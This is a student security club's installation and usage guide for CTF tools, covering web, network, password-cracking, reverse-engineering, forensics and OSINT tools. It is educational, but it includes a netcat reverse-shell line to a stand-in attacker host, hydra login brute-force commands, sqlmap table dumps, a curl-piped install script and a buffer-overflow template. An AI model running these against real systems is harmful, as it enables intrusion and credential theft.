# 🛠️ Tools Installation Guide

> **C!p#3r Club IIST** | Complete setup guide for your cybersecurity toolkit

---

## 🖥️ Prerequisites

Before installing tools, make sure you have one of these environments set up:

- **Kali Linux** (recommended — most tools pre-installed)
- **Ubuntu 22.04+**
- **WSL2 with Kali/Ubuntu** (Windows users)
- **Parrot OS**

> 📁 Environment setup guides: [Linux Setup](../setup/linux-setup.md) | [VM Setup](../setup/vm-setup.md) | [WSL Setup](../setup/wsl-setup.md)

---

## 🔄 Update Your System First

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y curl wget git python3 python3-pip python3-venv build-essential
```

---

## 🌐 Web Security Tools

### Burp Suite Community Edition

The most important tool for web CTF challenges. Already installed on Kali.

```bash
# Install on Kali (if not present)
sudo apt install -y burpsuite

# Or download from PortSwigger (Java required)
# https://portswigger.net/burp/communitydownload

# Launch
burpsuite
```

**Quick Setup:**
1. Open Burp → Proxy → Options → note the proxy port (default 8080)
2. Configure your browser to proxy through 127.0.0.1:8080
3. Install Burp's CA certificate in your browser for HTTPS

---

### Gobuster — Directory Brute Forcing

```bash
sudo apt install -y gobuster

# Usage examples:
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
gobuster dns -d target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

### ffuf — Web Fuzzer

```bash
sudo apt install -y ffuf
# Or build from source:
# go install github.com/ffuf/ffuf/v2@latest

# Usage examples:
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302
ffuf -u http://target.com/page?id=FUZZ -w numbers.txt  # Parameter fuzzing
```

---

### SQLMap — Automated SQL Injection

```bash
sudo apt install -y sqlmap

# Basic usage:
sqlmap -u "http://target.com/page?id=1"
sqlmap -u "http://target.com/page?id=1" --dbs          # List databases
sqlmap -u "http://target.com/page?id=1" -D dbname --tables  # List tables
sqlmap -u "http://target.com/page?id=1" -D db -T users --dump  # Dump table

# With Burp request file:
sqlmap -r request.txt --level=5 --risk=3
```

---

### Nikto — Web Server Scanner

```bash
sudo apt install -y nikto

nikto -h http://target.com
nikto -h http://target.com -ssl  # For HTTPS
```

---

## 🔍 Network Tools

### Nmap — Network Scanner

```bash
sudo apt install -y nmap

# Common scan types:
nmap -sV -sC target-ip              # Service/version + default scripts
nmap -sV -sC -p- target-ip         # All 65535 ports
nmap -A target-ip                   # Aggressive (OS detection, traceroute)
nmap -sU --top-ports 100 target-ip  # UDP top ports
nmap --script vuln target-ip        # Vulnerability scripts
nmap -sn 192.168.1.0/24            # Network sweep (no port scan)
```

---

### Wireshark — Packet Analyzer

```bash
sudo apt install -y wireshark
# During install: select "Yes" to allow non-root capture

# Add your user to wireshark group:
sudo usermod -aG wireshark $USER
newgrp wireshark

# Launch
wireshark

# Command-line version:
sudo apt install -y tshark
tshark -r capture.pcap
tshark -r capture.pcap -Y "http"   # Filter HTTP
```

---

### Netcat — The Swiss Army Knife

```bash
sudo apt install -y netcat-traditional

# Listen on a port:
nc -lvnp 4444

# Connect to a port:
nc target-ip 80

# Transfer a file:
# Receiver: nc -lvnp 4444 > received_file
# Sender:   nc receiver-ip 4444 < file_to_send

# Reverse shell (on target):
nc attacker-ip 4444 -e /bin/bash
```

---

## 🔐 Password Cracking

### John the Ripper

```bash
sudo apt install -y john

# Basic usage:
john hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=md5 hash.txt
john --show hash.txt                 # Show cracked passwords

# Identify hash type first:
john --list=formats | grep -i md5
```

---

### Hashcat — GPU Password Cracker

```bash
sudo apt install -y hashcat

# Identify hash type: https://hashcat.net/wiki/doku.php?id=hashcat
# -m 0   = MD5
# -m 100 = SHA1
# -m 1000 = NTLM
# -a 0   = Dictionary attack
# -a 3   = Brute force

hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a  # Brute force 6 chars
```

---

### Hydra — Network Login Brute Forcer

```bash
sudo apt install -y hydra

# SSH brute force:
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target-ip

# HTTP login form:
hydra -l admin -P wordlist.txt target-ip http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# FTP:
hydra -l user -P wordlist.txt ftp://target-ip
```

---

### rockyou.txt — The Essential Wordlist

```bash
# On Kali (already there):
ls /usr/share/wordlists/rockyou.txt.gz
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Install SecLists (massive wordlist collection):
sudo apt install -y seclists
ls /usr/share/seclists/
```

---

## ⚙️ Reverse Engineering

### Ghidra — Free NSA Decompiler

```bash
# Prerequisites:
sudo apt install -y default-jdk

# Download from: https://ghidra-sre.org/
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.0_build/ghidra_11.0_PUBLIC_20231222.zip
unzip ghidra_*.zip
cd ghidra_*/
./ghidraRun

# Kali install:
sudo apt install -y ghidra
```

---

### GDB with PEDA/GEF

```bash
sudo apt install -y gdb

# Install PEDA (Python Exploit Development Assistance):
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# Or install GEF (alternative):
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Basic GDB usage:
gdb ./binary
(gdb) run
(gdb) break main
(gdb) info functions
(gdb) x/20x $esp    # Examine memory
(gdb) disassemble main
```

---

### Radare2 — Reverse Engineering Framework

```bash
sudo apt install -y radare2

# Basic usage:
r2 binary              # Open binary
[0x...]> aaa           # Analyze all
[0x...]> pdf @ main    # Disassemble main
[0x...]> afl           # List functions
[0x...]> VV            # Visual mode
```

---

### Strings, file, xxd — Essential Static Analysis

```bash
# Identify file type:
file suspicious_binary

# Extract human-readable strings:
strings binary | grep -i "flag\|password\|key\|secret"

# Hex dump:
xxd binary | head -20
hexdump -C binary | head -20

# Check binary protections:
checksec binary   # Requires pwntools or checksec package
```

---

## 💥 Binary Exploitation

### pwntools — Python Exploit Framework

```bash
pip3 install pwntools

# Basic exploit template:
cat > exploit.py << 'EOF'
from pwn import *

# Connect to challenge
# p = process('./binary')          # Local
# p = remote('challenge.ip', 1337) # Remote

context.binary = './binary'
elf = ELF('./binary')

p = process('./binary')
log.info(f"PID: {p.pid}")

# Your exploit here
payload = b'A' * 72 + p64(0xdeadbeef)
p.sendlineafter(b'> ', payload)

p.interactive()
EOF

python3 exploit.py
```

---

### ROPgadget

```bash
pip3 install ropgadget

ROPgadget --binary ./binary
ROPgadget --binary ./binary --rop  # Find ROP gadgets
ROPgadget --binary ./binary --string "/bin/sh"
```

---

## 🔍 Forensics Tools

### Volatility 3 — Memory Forensics

```bash
pip3 install volatility3

# Basic usage:
python3 vol.py -f memory.dmp windows.info
python3 vol.py -f memory.dmp windows.pslist
python3 vol.py -f memory.dmp windows.cmdline
python3 vol.py -f memory.dmp linux.bash
python3 vol.py -f memory.dmp windows.filescan | grep ".txt"
```

---

### Binwalk — Firmware Analysis

```bash
sudo apt install -y binwalk

binwalk suspicious.bin          # Identify embedded files
binwalk -e suspicious.bin       # Extract everything
binwalk -dd '.*' suspicious.bin # Extract all file types
```

---

### Autopsy — Digital Forensics GUI

```bash
# Kali:
sudo apt install -y autopsy

# Or download: https://www.autopsy.com/download/
autopsy
# Open browser to: http://localhost:9999/autopsy
```

---

### Exiftool — Metadata Extractor

```bash
sudo apt install -y exiftool

exiftool image.jpg
exiftool -all image.jpg        # All metadata
exiftool -gps:all image.jpg    # GPS data
```

---

## 🖼️ Steganography Tools

```bash
# Steghide — hide/extract data from images
sudo apt install -y steghide
steghide extract -sf image.jpg
steghide info image.jpg

# zsteg — PNG/BMP steganography
gem install zsteg
zsteg image.png
zsteg -a image.png  # All checks

# Stegsolve — visual tool (Java)
wget https://github.com/zardus/ctf-tools/raw/master/stegsolve/install
# Or: 
wget http://www.caesum.com/handbook/Stegsolve.jar
java -jar Stegsolve.jar

# For audio steganography:
sudo apt install -y audacity
```

---

## 🕵️ OSINT Tools

```bash
# Sherlock — find usernames across social media
pip3 install sherlock-project
sherlock username

# theHarvester — email/domain recon
sudo apt install -y theharvester
theHarvester -d target.com -b google

# Maltego — visual OSINT
# Download: https://www.maltego.com/downloads/

# whois & nslookup
sudo apt install -y whois dnsutils
whois target.com
nslookup target.com
```

---

## 🎯 CTF Crypto Tools

```bash
# Python crypto libraries
pip3 install pycryptodome gmpy2 sympy z3-solver

# RsaCtfTool
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool && pip3 install -r requirements.txt
python3 RsaCtfTool.py --publickey pub.pem --uncipher cipher.txt

# CyberChef (no install — web-based):
# https://gchq.github.io/CyberChef/
```

---

## 📦 All-in-One Install Script

```bash
#!/bin/bash
# C!p#3r Club IIST — CTF Toolkit Installer
# Run on Kali Linux or Ubuntu

echo "[*] Updating system..."
sudo apt update && sudo apt upgrade -y

echo "[*] Installing base tools..."
sudo apt install -y curl wget git python3 python3-pip build-essential

echo "[*] Installing network tools..."
sudo apt install -y nmap wireshark tshark netcat-traditional

echo "[*] Installing web tools..."
sudo apt install -y burpsuite gobuster ffuf sqlmap nikto

echo "[*] Installing password tools..."
sudo apt install -y john hashcat hydra seclists

echo "[*] Installing forensics tools..."
sudo apt install -y wireshark binwalk exiftool foremost steghide autopsy

echo "[*] Installing RE tools..."
sudo apt install -y gdb ghidra radare2 ltrace strace

echo "[*] Installing Python packages..."
pip3 install pwntools pycryptodome gmpy2 sympy z3-solver requests ropgadget volatility3

echo "[*] Installing PEDA for GDB..."
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

echo "[*] Extracting rockyou.txt..."
sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true

echo "[+] Installation complete! Happy hacking!"
```

Save as `install.sh`, then run:
```bash
chmod +x install.sh
./install.sh
```

---

<div align="center">

*C!p#3r Club IIST — Decode · Defend · Dominate* 🔐

</div>
